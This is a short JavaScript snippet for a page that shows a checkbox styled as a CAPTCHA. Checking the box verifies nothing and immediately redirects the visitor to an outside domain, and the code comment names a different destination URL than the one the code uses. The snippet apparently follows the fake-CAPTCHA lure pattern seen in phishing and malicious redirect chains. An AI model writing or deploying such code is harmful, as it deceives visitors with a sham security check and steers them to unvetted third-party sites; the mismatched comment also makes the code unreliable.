document.addEventListener('DOMContentLoaded', function () {
    const captchaCheckbox = document.getElementById('captchaCheckbox');
    const statusMessage = document.getElementById('statusMessage');

    captchaCheckbox.addEventListener('change', function () {
        if (captchaCheckbox.checked) {
            // CAPTCHA verification successful, redirect to https://x201m.com/Profile
            window.location.href = 'https://itc4travel.com/redirect';
        } else {
            // CAPTCHA verification failed, display error message
            displayStatus('Please verify that you are not a robot.', false);
        }
    });

    function displayStatus(message, isSuccess) {
        statusMessage.textContent = message;
        statusMessage.style.color = isSuccess ? '#28a745' : '#dc3545';
    }
});
